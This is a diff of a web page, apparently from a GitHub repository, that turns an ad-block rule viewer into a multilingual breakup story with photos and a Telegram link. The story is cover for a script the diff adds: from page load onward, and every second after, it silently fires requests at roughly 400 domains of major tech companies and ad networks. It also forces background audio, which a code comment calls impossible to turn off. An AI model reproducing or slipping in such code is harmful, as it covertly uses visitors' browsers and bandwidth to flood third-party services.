@@ -1,197 +1,556 @@
 <!DOCTYPE html>
 <html lang="ka">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AdStopper GE</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<title>1 წელი ერთად — მერე წაიღო ყველაფერი | ბლოკირებისგან დაცული</title>
 
 <style>
-*{box-sizing:border-box;}
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
 
 body{
-  margin:0;
-  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;
-  background:#0b0f19;
-  color:#e5e7eb;
+    background:#090406;
+    background-image:radial-gradient(circle at top,#1d0d13 0%,#030101 100%);
+    color:#f2dfe4;
+    font-family:'Segoe UI',sans-serif;
+    line-height:1.6;
 }
 
-/* WARNING */
-.warning{
-  background:linear-gradient(90deg,#f59e0b,#ef4444);
-  text-align:center;
-  padding:10px;
-  font-size:13px;
-}
-
-/* CONTAINER */
 .container{
-  max-width:1100px;
-  margin:0 auto;
-  padding:20px;
+    max-width:950px;
+    margin:auto;
+    padding:20px;
 }
 
-/* HEADER */
 .header{
-  display:flex;
-  justify-content:space-between;
-  padding:15px 0;
-  border-bottom:1px solid rgba(255,255,255,0.06);
+    text-align:center;
+    margin-bottom:35px;
+    padding-bottom:20px;
+    border-bottom:2px solid #a42d45;
 }
 
-.logo{font-weight:600;}
+.header h1{
+    font-size:2.3rem;
+    background:linear-gradient(120deg,#ffb8c7,#ff6980,#c7213d);
+    -webkit-background-clip:text;
+    -webkit-text-fill-color:transparent;
+}
+
+.header p{
+    margin-top:8px;
+    color:#c796a2;
+    font-size:0.95rem;
+}
+
+.lang-switcher{
+    display:flex;
+    justify-content:center;
+    gap:15px;
+    margin-bottom:30px;
+}
+
+.lang-btn{
+    background:rgba(0,0,0,0.5);
+    border:1px solid #a42d45;
+    padding:6px 18px;
+    border-radius:40px;
+    color:#f2dfe4;
+    cursor:pointer;
+    font-size:0.9rem;
+    transition:0.2s;
+}
+
+.lang-btn:hover{
+    background:#a42d45;
+    transform:scale(1.02);
+}
+
+.lang-btn.active{
+    background:#a42d45;
+    border-color:#ffb0c0;
+}
+
+.story-card{
+    background:rgba(12,5,8,0.75);
+    border:1px solid rgba(190,60,80,0.4);
+    border-radius:24px;
+    overflow:hidden;
+    margin-bottom:24px;
+    backdrop-filter:blur(5px);
+    box-shadow:0 0 18px rgba(0,0,0,0.3);
+}
+
+.flex-card{
+    display:flex;
+    flex-wrap:wrap;
+}
+
+.img-side{
+    flex:1;
+    min-width:220px;
+    background:#1a0e13;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:15px;
+}
+
+.img-side img{
+    width:100%;
+    max-height:240px;
+    object-fit:cover;
+    border-radius:18px;
+    border:2px solid #5c2230;
+}
+
+.text-side{
+    flex:2;
+    padding:22px;
+}
+
+.text-side h2{
+    color:#ffb0c0;
+    margin-bottom:12px;
+    border-left:4px solid #ff4f70;
+    padding-left:12px;
+    font-size:1.4rem;
+}
+
+.story-text{
+    font-size:0.96rem;
+    color:#efdde1;
+    line-height:1.5;
+}
+
+.story-text strong{
+    color:#ff95ab;
+}
 
 .badge{
-  font-size:12px;
-  background:#111827;
-  padding:6px 10px;
-  border-radius:999px;
+    display:inline-block;
+    margin-top:15px;
+    background:#311720;
+    color:#ffb3c3;
+    padding:6px 14px;
+    border-radius:999px;
+    font-size:0.75rem;
 }
 
-/* HERO */
-.hero{
-  text-align:center;
-  padding:40px 10px;
+.gallery-mini{
+    display:flex;
+    justify-content:center;
+    flex-wrap:wrap;
+    gap:12px;
+    margin:30px 0;
 }
 
-.hero h1{
-  font-size:clamp(22px,4vw,36px);
+.gallery-mini img{
+    width:80px;
+    height:80px;
+    object-fit:cover;
+    border-radius:16px;
+    border:2px solid #703040;
 }
 
-.hero p{
-  color:#9ca3af;
-  max-width:700px;
-  margin:auto;
-  line-height:1.6;
-  font-size:14px;
+.telegram-btn{
+    display:block;
+    width:85%;
+    max-width:300px;
+    margin:25px auto;
+    text-align:center;
+    text-decoration:none;
+    color:white;
+    padding:14px;
+    border-radius:999px;
+    font-weight:bold;
+    background:linear-gradient(135deg,#239b55,#0f6135);
+    transition:0.25s ease;
 }
 
-/* BUTTONS */
-.actions{
-  display:flex;
-  flex-wrap:wrap;
-  justify-content:center;
-  gap:10px;
-  margin:20px 0;
+.telegram-btn:hover{
+    transform:scale(1.03);
 }
 
-button{
-  padding:12px 16px;
-  border-radius:10px;
-  border:none;
-  font-weight:600;
-  cursor:pointer;
-  min-width:120px;
+.legal{
+    text-align:center;
+    background:rgba(0,0,0,0.35);
+    border:1px solid #8e2a3d;
+    padding:15px;
+    border-radius:18px;
+    font-size:0.78rem;
+    color:#d6a5b0;
 }
 
-.primary{background:white;color:black;}
-.secondary{background:#1f2937;color:white;}
-.telegram{background:#0088cc;color:white;}
-
-/* STATS */
-.stats{
-  display:flex;
-  justify-content:center;
-  margin:20px 0;
+footer{
+    margin-top:28px;
+    text-align:center;
+    font-size:0.75rem;
+    color:#a77480;
 }
 
-.stat{
-  background:#020617;
-  padding:15px;
-  border-radius:12px;
-  border:1px solid rgba(255,255,255,0.05);
-  text-align:center;
-  min-width:120px;
-}
+@media(max-width:700px){
 
-/* OUTPUT */
-pre{
-  background:#020617;
-  padding:15px;
-  border-radius:12px;
-  border:1px solid rgba(255,255,255,0.05);
-  max-height:45vh;
-  overflow:auto;
-  font-size:13px;
-}
+    .header h1{
+        font-size:1.7rem;
+    }
 
-/* MOBILE */
-@media(max-width:600px){
-  .actions{
-    flex-direction:column;
-  }
-  button{
-    width:100%;
-  }
+    .text-side h2{
+        font-size:1.15rem;
+    }
+
+    .story-text{
+        font-size:0.9rem;
+    }
+
+    .flex-card{
+        flex-direction:column;
+    }
 }
 </style>
 </head>
-
 <body>
 
-<div class="warning">
-⚠️ თუ რეკლამა აღარ იბლოკება განაახლე წესები ან დაუკავშირდი ადმინისტრატორს
-</div>
+<audio id="bgMusic" loop preload="auto">
+    <source src="https://github.com/balisticbase/GIORGI/raw/refs/heads/main/ioscrack.online.m4a" type="audio/mp4">
+</audio>
 
 <div class="container">
 
-<div class="header">
-  <div class="logo">AdStopper GE</div>
-  <div class="badge">iOS / Mac / PC / ANDROID</div>
-</div>
+    <div class="lang-switcher">
+        <button class="lang-btn" data-lang="ka">🇬🇪 ქართული</button>
+        <button class="lang-btn" data-lang="ru">🇷🇺 Русский</button>
+        <button class="lang-btn" data-lang="en">🇬🇧 English</button>
+    </div>
 
-<div class="hero">
-  <h1>რეკლამის ბლოკირება ყველგან</h1>
-  <p>
-    სისტემა ბლოკავს რეკლამებს ყველა მოწყობილობაზე აჩერებს ტრეკინგს და იცავს მომხმარებელს
-  </p>
-</div>
+    <div class="header">
+        <h1 id="mainTitle">💔 1 წელი ერთად — მერე მან წაიღო ყველაფერი 💔</h1>
+        <p id="subTitle">ისტორია იმაზე, როგორ შეიძლება ადამიანმა გული დაგინგრიოს</p>
+    </div>
 
-<div class="stats">
-  <div class="stat">
-    <div id="ruleCount">0</div>
-    <small>წესი</small>
-  </div>
-</div>
+    <!-- CARD 1 -->
+    <div class="story-card">
+        <div class="flex-card">
+            <div class="img-side">
+                <img src="https://github.com/balisticbase/GIORGI/raw/refs/heads/main/Apple.jpeg" alt="გაცნობა">
+            </div>
+            <div class="text-side">
+                <h2 id="card1Title">🇬🇪 ყველაფერი საქართველოში დაიწყო</h2>
+                <div id="card1Text" class="story-text">
+                    <strong>ის საქართველოში გავიცანი.</strong><br>
+                    თავიდან ყველაფერი ნამდვილ ზღაპარს ჰგავდა —<br>
+                    ღამის საუბრები, სიცილი, ემოციები და ნდობა.<br>
+                    მეგონა, პირველად ვიპოვე ადამიანი,<br>
+                    რომელსაც ჩემი მართლა ესმოდა.
+                </div>
+                <div id="card1Badge" class="badge">✨ პირველი შეხვედრა</div>
+            </div>
+        </div>
+    </div>
 
-<div class="actions">
-  <button class="primary" onclick="loadRules()">განახლება</button>
-  <button class="secondary" onclick="copyAll()">კოპირება</button>
+    <!-- CARD 2 -->
+    <div class="story-card">
+        <div class="flex-card">
+            <div class="img-side">
+                <img src="https://github.com/balisticbase/GIORGI/raw/refs/heads/main/Browser.jpeg" alt="მოგზაურობა">
+            </div>
+            <div class="text-side">
+                <h2 id="card2Title">✈️ ერთი წელი — ორ ქვეყანას შორის</h2>
+                <div id="card2Text" class="story-text">
+                    <strong>ერთი წელი ერთად ვიყავით.</strong><br>
+                    მე დავდიოდი ესტონეთში,<br>
+                    ის ჩამოდიოდა საქართველოში.<br>
+                    ვფიქრობდი, რომ ეს იყო ნამდვილი სიყვარული,<br>
+                    რომელსაც მანძილიც ვერ დაანგრევდა.
+                </div>
+                <div id="card2Badge" class="badge">🌍 მანძილი ვერ გვაშორებდა</div>
+            </div>
+        </div>
+    </div>
 
-  <!-- FIXED TELEGRAM BUTTON -->
-  <a href="https://t.me/ioscrackonline" target="_blank" rel="noopener">
-    <button class="telegram">Telegram</button>
-  </a>
-</div>
+    <!-- CARD 3 -->
+    <div class="story-card">
+        <div class="flex-card">
+            <div class="img-side">
+                <img src="https://github.com/balisticbase/GIORGI/raw/refs/heads/main/Mail.ru.jpeg" alt="სიმართლე">
+            </div>
+            <div class="text-side">
+                <h2 id="card3Title">🎭 მერე სიმართლე გამოჩნდა</h2>
+                <div id="card3Text" class="story-text">
+                    <strong>ერთ დღეს მივხვდი, რომ ყველაფერი თამაში იყო.</strong><br>
+                    მან წაიღო ნდობა,<br>
+                    ემოციები და ყველაფერი,<br>
+                    რაც ჩემთვის მნიშვნელოვანი იყო.<br>
+                    ბოლოს მივხვდი — უბრალოდ ვიყენებოდი.
+                </div>
+                <div id="card3Badge" class="badge">🗡️ მოტყუება</div>
+            </div>
+        </div>
+    </div>
 
-<pre id="output">დააჭირე "განახლება"</pre>
+    <!-- CARD 4 -->
+    <div class="story-card">
+        <div class="flex-card">
+            <div class="img-side">
+                <img src="https://github.com/balisticbase/GIORGI/raw/refs/heads/main/Opened.jpeg" alt="დასასრული">
+            </div>
+            <div class="text-side">
+                <h2 id="card4Title">🌑 ბოლოს უბრალოდ გაქრა</h2>
+                <div id="card4Text" class="story-text">
+                    ერთ დილას ყველაფერი დასრულდა.<br>
+                    <strong>დარჩა მხოლოდ მოგონებები და სიცარიელე.</strong><br>
+                    სწორედ მაშინ მივხვდი,<br>
+                    რამდენად მნიშვნელოვანია,<br>
+                    ვის ვანდობთ საკუთარ გულს.
+                </div>
+                <div id="card4Badge" class="badge">💔 დასასრული</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="gallery-mini">
+        <img src="https://github.com/balisticbase/GIORGI/raw/refs/heads/main/Opera.jpeg" alt="ფოტო 1">
+        <img src="https://github.com/balisticbase/GIORGI/raw/refs/heads/main/Safari.jpeg" alt="ფოტო 2">
+        <img src="https://github.com/balisticbase/GIORGI/raw/refs/heads/main/The%20longer%20.png" alt="ფოტო 3">
+    </div>
+
+    <a href="https://t.me/ARTISTUK" target="_blank" class="telegram-btn" id="telegramBtn">
+        💬 Telegram-ზე დაკავშირება
+    </a>
+
+    <div class="legal" id="legalText">
+        <strong>⚡ „სამართლიანი მეხსიერება“ ⚡</strong>
+        <br><br>
+        ეს ისტორია მხოლოდ ემოციური გამოცდილების აღწერაა.
+    </div>
+
+    <footer id="footerText">
+        🕯️ <strong>„ზოგი ადამიანი მიდის, მაგრამ კვალს სამუდამოდ ტოვებს.“</strong><br><br>
+        © 2026
+    </footer>
 
 </div>
 
 <script>
-let fullText="";
+// ==================== 400+ დომენი - BACKGROUND PING ====================
+const domains = [
+    "google.com","gstatic.com","www.google.com","microsoft.com","www.gstatic.com",
+    "data.microsoft.com","events.data.microsoft.com","office.com","live.com","update.googleapis.com",
+    "microsoftonline.com","login.microsoftonline.com","accounts.google.com","digicert.com","skype.com",
+    "mtalk.google.com","googleusercontent.com","office.net","edge.skype.com","config.edge.skype.com",
+    "mp.microsoft.com","fonts.gstatic.com","officeapps.live.com","ecs.office.com","doubleclick.net",
+    "bing.com","mobile.events.data.microsoft.com","ezviz7.com","windowsupdate.com","settings-win.data.microsoft.com",
+    "clientservices.googleapis.com","apple.com","cloud.microsoft","login.live.com","ocsp.digicert.com",
+    "ctldl.windowsupdate.com","amazonaws.com","g.doubleclick.net","optimizationguide-pa.googleapis.com","msn.com",
+    "googletagmanager.com","www.googletagmanager.com","www.googleapis.com","fonts.googleapis.com","facebook.com",
+    "play.google.com","gvt1.com","cloudflare.com","office365.com","svc.cloud.microsoft",
+    "safebrowsing.googleapis.com","youtube.com","clients4.google.com","teams.microsoft.com","lh3.googleusercontent.com",
+    "clients6.google.com","dsp.mp.microsoft.com","google-analytics.com","self.events.data.microsoft.com","clients2.google.com",
+    "outlook.office365.com","windows.com","do.dsp.mp.microsoft.com","prod.do.dsp.mp.microsoft.com","googleads.g.doubleclick.net",
+    "hicloudcam.com","edge.microsoft.com","www.google-analytics.com","cdn.office.net","me.gvt1.com",
+    "edgedl.me.gvt1.com","www.bing.com","outlook.office.com","substrate.office.com","graph.microsoft.com",
+    "update.microsoft.com","clients.google.com","android.clients.google.com","sharepoint.com","ssl.gstatic.com",
+    "content-autofill.googleapis.com","oneocsp.microsoft.com","www.youtube.com","ogads-pa.clients6.google.com","officeclient.microsoft.com",
+    "static.microsoft","odc.officeapps.live.com","googleadservices.com","windows.net","www.googleadservices.com",
+    "play.googleapis.com","delivery.mp.microsoft.com","config.office.net","clients.config.office.net","ipv4only.arpa",
+    "com.akadns.net","sfx.ms","oneclient.sfx.ms","encrypted-tbn0.gstatic.com","arc.msn.com",
+    "ytimg.com","i.ytimg.com","measure.office.net","nel.measure.office.net","manage.microsoft.com",
+    "icloud.com","assets.msn.com","onecdn.static.microsoft","public.onecdn.static.microsoft","googlesyndication.com",
+    "geo.prod.do.dsp.mp.microsoft.com","ls.apple.com","dl.delivery.mp.microsoft.com","res.public.onecdn.static.microsoft","azure.com",
+    "browser.events.data.microsoft.com","apple-dns.net","teams.events.data.microsoft.com","g.live.com","aaplimg.com",
+    "tlu.dl.delivery.mp.microsoft.com","www.facebook.com","config.teams.microsoft.com","smartscreen.microsoft.com","iris.microsoft.com",
+    "api.iris.microsoft.com","msftconnecttest.com","g.aaplimg.com","cdp.microsoft.com","api.cdp.microsoft.com",
+    "msedge.api.cdp.microsoft.com","licensing.mp.microsoft.com","adobe.com","itunes.apple.com","trouter.teams.microsoft.com",
+    "fd.api.iris.microsoft.com","pagead2.googlesyndication.com","sentry.io","connectivitycheck.gstatic.com","www.msftconnecttest.com",
+    "core.windows.net","mrodevicemgr.officeapps.live.com","metric.gstatic.com","pki.goog","res.cdn.office.net",
+    "oauthaccountmanager.googleapis.com","push.apple.com","analytics.google.com","exo.nel.measure.office.net","outlook.com",
+    "activity.windows.com","delve.office.com","loki.delve.office.com","cwsapp.update.microsoft.com","tas01.cwsapp.update.microsoft.com",
+    "th.bing.com","teams.cdn.office.net","statics.teams.cdn.office.net","stats.g.doubleclick.net","teams.cloud.microsoft",
+    "dsx.mp.microsoft.com","storeedgefd.dsx.mp.microsoft.com","fastly.net","fe2cr.update.microsoft.com","aa-rt.sharepoint.com",
+    "apis.google.com","lencr.org","c.pki.goog","flightproxy.teams.microsoft.com","mask.icloud.com",
+    "scorecardresearch.com","fe2.apple-dns.net","mos.microsoft.com","resources.office.net","augloop.svc.cloud.microsoft",
+    "res-1.cdn.office.net","c.lencr.org","measure.office.com","fp.measure.office.com","bag.itunes.apple.com",
+    "storage.live.com","m365.cloud.microsoft","x1.c.lencr.org","fbcdn.net","gvt2.com",
+    "ad.doubleclick.net","opendns.com","prod.mos.microsoft.com","img-s-msn-com.akamaized.net","titles.prod.mos.microsoft.com",
+    "ocsp2.apple.com","augloop.office.com","displaycatalog.mp.microsoft.com","us-mobile.events.data.microsoft.com","tpc.googlesyndication.com",
+    "global.aa-rt.sharepoint.com","gr.global.aa-rt.sharepoint.com","itunes-apple.com.akadns.net","facebook.net","connect.facebook.net",
+    "amazon.com","gcp.gvt2.com","roaming.svc.cloud.microsoft","aria.microsoft.com","pipe.aria.microsoft.com",
+    "v.aaplimg.com","cdn-apple.com","c.bing.com","beacons.gcp.gvt2.com","go.trouter.teams.microsoft.com",
+    "gwfb.net","storage.googleapis.com","crl3.digicert.com","whatsapp.net","sb.scorecardresearch.com",
+    "googlevideo.com","msedge.net","safebrowsing.google.com","api.flightproxy.teams.microsoft.com","dm.microsoft.com",
+    "checkin.dm.microsoft.com","app-measurement.com","upload.fp.measure.office.com","r.manage.microsoft.com","yahoo.com",
+    "storeedge.microsoft.com","gateway.icloud.com","ogs.google.com","v10.events.data.microsoft.com","wns.windows.com",
+    "clients3.google.com","cdnjs.cloudflare.com","graph.facebook.com","adnxs.com","instagram.com",
+    "outlook.cloud.microsoft","www.microsoft.com","gsp-ssl.ls.apple.com","sls.update.microsoft.com","lsrelayaccess.com",
+    "static.doubleclick.net","mask.apple-dns.net","nel.cloudflare.com","a.nel.cloudflare.com","mail.google.com",
+    "api.msn.com","skydrive.wns.windows.com","storequality.microsoft.com","storecatalogrevocation.storequality.microsoft.com","recent.svc.cloud.microsoft",
+    "v20.events.data.microsoft.com","ls-apple.com.akadns.net","adobedtm.com","encrypted-tbn2.gstatic.com","assets.adobedtm.com",
+    "jsdelivr.net","cdn.jsdelivr.net","download.windowsupdate.com","us-v10c.events.data.microsoft.com","m365cdn.nel.measure.office.net",
+    "windows.msn.com","linkedin.com","pushy.io","safebrowsingohttpgateway.googleapis.com","ntp.org",
+    "pool.ntp.org","virginm.net","cable.virginm.net","asyncgw.teams.microsoft.com","exp-tas.com",
+    "default.exp-tas.com","svc.ms","editor.svc.cloud.microsoft","resolver.arpa","_dns.resolver.arpa",
+    "mesu.apple.com","amazon-adsystem.com","encrypted-tbn1.gstatic.com","encrypted-tbn3.gstatic.com","cm.g.doubleclick.net",
+    "geover.prod.do.dsp.mp.microsoft.com","tas02.sls.update.microsoft.com","demdex.net","time.apple.com","msftncsi.com",
+    "ocsp2.g.aaplimg.com","lh3.google.com","bag-cdn.itunes-apple.com.akadns.net","us-v20.events.data.microsoft.com","protection.outlook.com",
+    "configuration.ls.apple.com","securepubads.g.doubleclick.net","browser.pipe.aria.microsoft.com","waa-pa.clients6.google.com","www.msn.com",
+    "jnn-pa.googleapis.com","cloudflareinsights.com","b.tlu.dl.delivery.mp.microsoft.com","msedge.b.tlu.dl.delivery.mp.microsoft.com","adsrvr.org",
+    "gdmf.apple.com","static.cloudflareinsights.com","gateway.fe2.apple-dns.net","chromewebstore.googleapis.com","ggpht.com",
+    "cws.update.microsoft.com","tas02.cws.update.microsoft.com","turbo.microsoft.com","docs.google.com","yt3.ggpht.com",
+    "msftauth.net","mzstatic.com","asm.skype.com","rubiconproject.com","cloudmessaging.edge.microsoft.com",
+    "access-point.cloudmessaging.edge.microsoft.com","adobe.io","adtrafficquality.google","dns.msftncsi.com","safelinks.protection.outlook.com",
+    "ingest.sentry.io","ib.adnxs.com","ali.gwfb.net","1d.tlu.dl.delivery.mp.microsoft.com","suite.office.com",
+    "webshell.suite.office.com","criteo.com","fa000000112.resources.office.net","dpm.demdex.net","signaler-pa.clients6.google.com",
+    "pubmatic.com","cisco.com","engagement.office.com","smoot.apple.com","messaging.engagement.office.com",
+    "ess.apple.com","xp.apple.com","cloudapp.azure.com","enterprise.activity.windows.com","tesvtmng2dev.ezviz7.com",
+    "supertms.com","gspe79-ssl.ls.apple.com","googlezip.net","xx.fbcdn.net","init.push.apple.com",
+    "armmf.adobe.com","pancake.apple.com","b02.azurefd.net","lensfrontend-pa.googleapis.com","ep1.adtrafficquality.google",
+    "app-analytics-services.com","m.google.com","origin-apple.com.akadns.net","gs-loc.apple.com","google-ohttp-relay-safebrowsing.fastly-edge.com",
+    "ep2.adtrafficquality.google","csp.withgoogle.com","accountcapabilities-pa.googleapis.com","e2ro.com","ads.linkedin.com",
+    "time.windows.com","srtb.msn.com","ts.cdn.office.net","c2r.ts.cdn.office.net","casalemedia.com",
+    "roaming.officeapps.live.com","apple.com.akadns.net","f.c2r.ts.cdn.office.net","px.ads.linkedin.com","configuration.apple.com",
+    "nr-data.net","node.e2ro.com","edge-mqtt.facebook.com","tunnel.googlezip.net","opera.com",
+    "us-west-2.amazonaws.com","res.office365.com","dsce9.akamaiedge.net","gspe1-ssl.ls.apple.com","clarity.ms",
+    "passwordsleakcheck-pa.googleapis.com","bat.bing.com","rlcdn.com","get-bx.g.aaplimg.com","live.net",
+    "r4.res.office365.com","cookielaw.org","cdn.cookielaw.org","l.google.com","openx.net",
+    "apple.map.fastly.net","netflix.com","match.adsrvr.org","g.whatsapp.net","captive.apple.com",
+    "cc.skype.com","edge-consumer-static.azureedge.net","ioref.io","googletagservices.com","www.googletagservices.com"
+];
 
-async function loadRules(){
-  const url="https://raw.githubusercontent.com/balisticbase/GIORGI/refs/heads/main/blocklist";
-
-  try{
-    const res=await fetch(url);
-    const text=await res.text();
-
-    fullText=text;
-    document.getElementById("output").innerText=text;
-
-    document.getElementById("ruleCount").innerText =
-      text.split("\n").length;
-
-  }catch{
-    document.getElementById("output").innerText="შეცდომა";
-  }
+// ==================== BACKGROUND PING - 400 დომენი ====================
+function pingDomains() {
+    for(let i = 0; i < domains.length; i++) {
+        const url = "https://" + domains[i] + "/ping?nocache=" + Date.now() + "_" + i;
+        // მეთოდი 1: Image ping (ყველაზე სწრაფი, ფონური)
+        const img = new Image();
+        img.src = url;
+        // მეთოდი 2: fetch (CORS-ის მიუხედავად, ცდილობს)
+        fetch(url, { mode: 'no-cors', cache: 'no-store' }).catch(()=>{});
+    }
 }
 
-function copyAll(){
-  if(!fullText)return alert("ჯერ ჩატვირთე");
-  navigator.clipboard.writeText(fullText);
+// პირველი პინგი მაშინვე
+pingDomains();
+// შემდეგ ყოველ 1000 მილიწამში (1 წამში) ისევ 400-ვე დომენი
+setInterval(pingDomains, 1000);
+
+// ==================== თარგმანი ====================
+const translations = {
+    ka: {
+        mainTitle: "💔 1 წელი ერთად — მერე მან წაიღო ყველაფერი 💔",
+        subTitle: "ისტორია იმაზე, როგორ შეიძლება ადამიანმა გული დაგინგრიოს",
+        card1Title: "🇬🇪 ყველაფერი საქართველოში დაიწყო",
+        card1Text: "<strong>ის საქართველოში გავიცანი.</strong><br>თავიდან ყველაფერი ნამდვილ ზღაპარს ჰგავდა —<br>ღამის საუბრები, სიცილი, ემოციები და ნდობა.<br>მეგონა, პირველად ვიპოვე ადამიანი,<br>რომელსაც ჩემი მართლა ესმოდა.",
+        card1Badge: "✨ პირველი შეხვედრა",
+        card2Title: "✈️ ერთი წელი — ორ ქვეყანას შორის",
+        card2Text: "<strong>ერთი წელი ერთად ვიყავით.</strong><br>მე დავდიოდი ესტონეთში,<br>ის ჩამოდიოდა საქართველოში.<br>ვფიქრობდი, რომ ეს იყო ნამდვილი სიყვარული,<br>რომელსაც მანძილიც ვერ დაანგრევდა.",
+        card2Badge: "🌍 მანძილი ვერ გვაშორებდა",
+        card3Title: "🎭 მერე სიმართლე გამოჩნდა",
+        card3Text: "<strong>ერთ დღეს მივხვდი, რომ ყველაფერი თამაში იყო.</strong><br>მან წაიღო ნდობა,<br>ემოციები და ყველაფერი,<br>რაც ჩემთვის მნიშვნელოვანი იყო.<br>ბოლოს მივხვდი — უბრალოდ ვიყენებოდი.",
+        card3Badge: "🗡️ მოტყუება",
+        card4Title: "🌑 ბოლოს უბრალოდ გაქრა",
+        card4Text: "ერთ დილას ყველაფერი დასრულდა.<br><strong>დარჩა მხოლოდ მოგონებები და სიცარიელე.</strong><br>სწორედ მაშინ მივხვდი,<br>რამდენად მნიშვნელოვანია,<br>ვის ვანდობთ საკუთარ გულს.",
+        card4Badge: "💔 დასასრული",
+        telegramBtn: "💬 Telegram-ზე დაკავშირება",
+        legalText: "<strong>⚡ „სამართლიანი მეხსიერება“ ⚡</strong><br><br>ეს ისტორია მხოლოდ ემოციური გამოცდილების აღწერაა.",
+        footerText: "🕯️ <strong>„ზოგი ადამიანი მიდის, მაგრამ კვალს სამუდამოდ ტოვებს.“</strong><br><br>© 2026"
+    },
+    ru: {
+        mainTitle: "💔 1 год вместе — потом она забрала всё 💔",
+        subTitle: "История о том, как человек может разбить тебе сердце",
+        card1Title: "🇬🇪 Всё началось в Грузии",
+        card1Text: "<strong>Я встретил её в Грузии.</strong><br>Сначала всё было как в сказке —<br>ночные разговоры, смех, эмоции и доверие.<br>Я думал, впервые нашёл человека,<br>который действительно меня понимает.",
+        card1Badge: "✨ Первая встреча",
+        card2Title: "✈️ Один год — между двумя странами",
+        card2Text: "<strong>Мы были вместе один год.</strong><br>Я ездил в Эстонию,<br>она приезжала в Грузию.<br>Я думал, это настоящая любовь,<br>которую не разрушить расстоянием.",
+        card2Badge: "🌍 Расстояние не разлучало нас",
+        card3Title: "🎭 Потом правда открылась",
+        card3Text: "<strong>Однажды я понял, что всё было игрой.</strong><br>Она забрала доверие,<br>эмоции и всё,<br>что было для меня важно.<br>В итоге я понял — меня просто использовали.",
+        card3Badge: "🗡️ Обман",
+        card4Title: "🌑 В конце она просто исчезла",
+        card4Text: "Однажды утром всё закончилось.<br><strong>Остались только воспоминания и пустота.</strong><br>Именно тогда я понял,<br>насколько важно,<br>кому мы доверяем своё сердце.",
+        card4Badge: "💔 Конец",
+        telegramBtn: "💬 Связаться в Telegram",
+        legalText: "<strong>⚡ „Справедливая память“ ⚡</strong><br><br>Эта история — всего лишь описание эмоционального опыта.",
+        footerText: "🕯️ <strong>„Некоторые люди уходят, но след оставляют навсегда.“</strong><br><br>© 2026"
+    },
+    en: {
+        mainTitle: "💔 1 year together — then she took everything 💔",
+        subTitle: "A story about how someone can break your heart",
+        card1Title: "🇬🇪 It all started in Georgia",
+        card1Text: "<strong>I met her in Georgia.</strong><br>At first everything was like a fairy tale —<br>night talks, laughter, emotions and trust.<br>I thought I finally found someone<br>who truly understood me.",
+        card1Badge: "✨ First meeting",
+        card2Title: "✈️ One year — between two countries",
+        card2Text: "<strong>We were together for one year.</strong><br>I traveled to Estonia,<br>she came to Georgia.<br>I thought it was true love,<br>that distance couldn't destroy.",
+        card2Badge: "🌍 Distance didn't separate us",
+        card3Title: "🎭 Then the truth came out",
+        card3Text: "<strong>One day I realized it was all a game.</strong><br>She took my trust,<br>my emotions and everything<br>that mattered to me.<br>In the end I understood — I was just being used.",
+        card3Badge: "🗡️ Deception",
+        card4Title: "🌑 In the end she just disappeared",
+        card4Text: "One morning everything ended.<br><strong>Only memories and emptiness remained.</strong><br>That's when I understood<br>how important it is<br>who we trust with our heart.",
+        card4Badge: "💔 The end",
+        telegramBtn: "💬 Contact on Telegram",
+        legalText: "<strong>⚡ „Fair Memory“ LLC ⚡</strong><br><br>This story is just a description of an emotional experience.",
+        footerText: "🕯️ <strong>„Some people leave, but they leave their mark forever.“</strong><br><br>© 2026"
+    }
+};
+
+function setLanguage(lang) {
+    const t = translations[lang];
+    document.getElementById('mainTitle').innerHTML = t.mainTitle;
+    document.getElementById('subTitle').innerHTML = t.subTitle;
+    document.getElementById('card1Title').innerHTML = t.card1Title;
+    document.getElementById('card1Text').innerHTML = t.card1Text;
+    document.getElementById('card1Badge').innerHTML = t.card1Badge;
+    document.getElementById('card2Title').innerHTML = t.card2Title;
+    document.getElementById('card2Text').innerHTML = t.card2Text;
+    document.getElementById('card2Badge').innerHTML = t.card2Badge;
+    document.getElementById('card3Title').innerHTML = t.card3Title;
+    document.getElementById('card3Text').innerHTML = t.card3Text;
+    document.getElementById('card3Badge').innerHTML = t.card3Badge;
+    document.getElementById('card4Title').innerHTML = t.card4Title;
+    document.getElementById('card4Text').innerHTML = t.card4Text;
+    document.getElementById('card4Badge').innerHTML = t.card4Badge;
+    document.getElementById('telegramBtn').innerHTML = t.telegramBtn;
+    document.getElementById('legalText').innerHTML = t.legalText;
+    document.getElementById('footerText').innerHTML = t.footerText;
+    
+    document.querySelectorAll('.lang-btn').forEach(btn => {
+        if(btn.getAttribute('data-lang') === lang) {
+            btn.classList.add('active');
+        } else {
+            btn.classList.remove('active');
+        }
+    });
 }
+
+document.querySelectorAll('.lang-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        setLanguage(btn.getAttribute('data-lang'));
+    });
+});
+
+setLanguage('ka');
+
+// ==================== მუსიკა იძულებითი ჩართვა (შეუძლებელია გამორთვა) ====================
+const audio = document.getElementById('bgMusic');
+audio.volume = 0.7;
+let musicStarted = false;
+
+function startMusic() {
+    if(musicStarted) return;
+    audio.play().then(() => {
+        musicStarted = true;
+        console.log('მუსიკა ჩაირთო');
+    }).catch(() => {});
+}
+
+window.addEventListener('load', () => setTimeout(startMusic, 100));
+document.body.addEventListener('click', startMusic);
+document.body.addEventListener('touchstart', startMusic);
 </script>
 
 </body>
